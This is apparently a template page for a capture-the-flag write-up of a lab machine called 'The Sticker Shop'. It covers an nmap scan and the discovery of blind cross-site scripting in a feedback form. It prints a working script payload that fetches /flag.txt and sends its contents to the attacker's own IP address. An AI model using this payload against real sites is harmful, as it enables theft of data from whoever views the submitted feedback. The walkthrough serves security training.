{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We run a basic port scan.")}}

{{console("nmap -T5 -p- -sC -sV 10.10.168.196", "Nmap scan report for 10.10.168.196
Host is up (0.068s latency).
Not shown: 59605 closed tcp ports (conn-refused), 5928 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
...")}}

{{text("We find 2 open ports: ")}}

{{list(['8080 (HTTP)', '22 (SSH)'])}}

{{header("Getting the flag", "flag")}}

{{text("Upon visiting the website we are met with a shop for cat stickers. It consists of a home and send feedback tabs.")}}

{{image("../../static/writeups/thestickershop/images/000001.jpg")}}

{{text("Website is very basic and I couldn't find anything interesting besides the form for submitting your feedback.")}}

{{image("../../static/writeups/thestickershop/images/000002.jpg")}}

{{text("Let's follow the challange description and try to access <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/flag.txt</code>.")}}

{{image("../../static/writeups/thestickershop/images/000003.jpg")}}

{{text("This resource exists but we don't have neccessary permissions to view it.")}}

{{text("Since the challange talks about client-side exploitation I immediately thought about <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cross-site scripting</code> (XSS).")}}

{{text("I tried using a couple of payloads on the form but couldn't get them to work.")}}

{{text("Then I set up a python web server on port 80 and tried to make a connection to myself.")}}

{{text("We send an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>img</code> element with our IP as the source.")}}

{{image("../../static/writeups/thestickershop/images/000004.jpg")}}

{{text("We should receive a GET request.")}}

{{image("../../static/writeups/thestickershop/images/000005.jpg")}}

{{text("It works. Now we do the same thing but this time we need to also read the flag.")}}

{{text("I created a script tag that will fetch the flag and send it to us.")}}

{{console("<script>
    fetch('/flag.txt')
        .then(response => response.text())
        .then(data => {
            window.location.href = 'http://10.9.1.230/?flag=' + encodeURIComponent(data);
        });
</script>", "")}}

{{text("We should receive the flag.")}}

{{image("../../static/writeups/thestickershop/images/000006.jpg")}}

{{script()}}
